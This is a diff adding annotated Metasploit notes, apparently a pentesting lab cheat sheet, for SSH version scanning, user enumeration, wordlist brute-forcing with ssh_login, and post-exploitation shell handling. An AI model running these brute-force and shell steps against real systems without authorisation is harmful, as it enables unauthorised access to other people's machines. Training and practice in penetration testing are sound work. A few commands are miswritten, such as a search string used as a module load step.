@@ -42,3 +42,45 @@ brute-force attack using the “admin” username. This script will attempt to g
 In msfconsole, the ssh_login auxiliary module is used to perform SSH login attempts on a target system to test credentials. 
 This module tries various combinations of usernames and passwords to find valid login credentials.
 > use auxiliary/scanner/ssh/ssh_login
+
+
+♦ SSH Enumeration and Brute-Force Login (Metasploit)
+
+Secure Shell → Enumeration. Post 22         # SSH Port
+ifconfig → 192.30.120.2                     # Your local IP address
+target IP → 192.30.120.3                    # The target machine's IP address
+
+→ service postgresql Start                  # Start the required database service for Metasploit
+→ msfconsole                                # Start the Metasploit Framework console
+→ workspace -a SSH_Enum                     # Create and switch to a Metasploit workspace
+→ setg RHOSTS 192.30.120.3                  # Globally set the target IP
+→ setg RHOST 192.30.120.3                   # Globally set the target IP
+
+♦ SSH Version Scanning
+→ search type:auxiliary name:ssh            # Search for SSH-related auxiliary modules
+→ Use auxiliary/scanner/ssh/ssh_version     # Load the SSH version scanner module
+→ show options                              # View required options
+→ run                                       # Execute the module
+
+♦ SSH User Enumeration (Optional Step)
+→ Search ssh_enumusers                      # Search for user enumeration module
+→ Use type:auxiliary name:ssh               # Load the module (e.g., auxiliary/scanner/ssh/ssh_enumusers)
+→ Set USER_FILE /usr/.../common_users.txt   # Set the path to the username list
+→ run                                       # Execute the module
+
+♦ SSH Login Brute-Force
+→ Search openssh / Search type:auxiliary name:ssh            # Search for the login module
+→ Use auxiliary/scanner/ssh/ssh_login                        # Load the SSH login brute-forcer module
+→ Show options                                               # View required options
+→ Set USER_FILE /usr/.../Common_users.txt                    # Set the path to the username list
+→ Set PASS_FILE /usr/.../Common_passwords.txt                # Set the path to the password list
+→ run                                                        # Execute the brute-force attack
+
+♦ Post-Exploitation Session Management
+→ sessions                                   # List active Meterpreter/shell sessions
+→ sessions -i 1                              # Interact with the specified session ID (e.g., 1)
+→ ls                                         # List files in the current directory (within the shell)
+→ /bin/bash -i                               # Attempt to spawn an interactive Bash shell
+→ ls                                         # List files in the current directory 
+→ whoami                                     # Check the current user in the shell
+→ exit / y                                   # Exit the shell session
